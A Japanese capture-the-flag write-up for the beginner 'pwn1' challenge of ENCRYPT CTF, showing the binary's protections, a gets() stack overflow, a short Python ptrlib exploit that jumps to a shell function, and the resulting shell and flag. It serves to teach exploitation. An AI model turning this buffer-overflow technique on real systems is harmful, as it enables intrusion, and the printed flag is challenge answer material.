# [pwn 50pts] pwn1 - ENCRYPT CTF
32bitバイナリでセキュリティ機構は基本的に無効のようです。
```
$ checksec pwn1
[*] 'pwn1'
    Arch:	32 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	No RELRO
    PIE:	PIE disabled
```
IDAで解析しましょう。
getsによるスタックオーバーフローがあります。
また、`/bin/sh`を呼んでくれるshell関数があるので、これを呼び出せば良さそうです。

```python
from ptrlib import *

elf = ELF("./pwn1")
sock = Process("./pwn1")
sock.sendline(b"A" * 140 + p32(elf.symbol("shell")))
sock.interactive()
```

```
$ python solve.py 
[+] Process: Successfully created new process (PID=7284)
Tell me your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA­
                                                                   
[ptrlib]$ cat flag.txt
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
[ptrlib]$
```

# 感想
pwn初心者向け問題ですね。